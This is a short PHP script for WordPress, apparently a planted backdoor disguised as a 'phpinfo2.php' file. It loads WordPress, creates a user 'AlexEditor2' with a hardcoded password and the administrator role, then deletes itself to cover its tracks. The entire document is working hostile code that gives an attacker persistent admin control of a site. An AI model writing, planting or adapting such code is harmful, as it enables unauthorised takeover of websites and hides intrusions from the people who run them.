<?PHP
error_reporting(E_ALL);
require_once("../../../../wp-blog-header.php");
require_once('../../../../wp-includes/registration.php');
$u_name = 'AlexEditor2';
$u_id = username_exists( $u_name );
echo $u_id;
if(!$u_id)
{
  $new_password = 'RepzdrfYtrepzdfz712AnhytB';
  $u_id = wp_create_user( $u_name, $new_password, '1@1.com' );
  $wp_user_object = new WP_User($u_id);
  $wp_user_object->set_role('administrator');
  unlink('./phpinfo2.php');
  echo 'OK';
}
else
{
  echo 'ERROR';
  unlink('./phpinfo2.php');
}
?>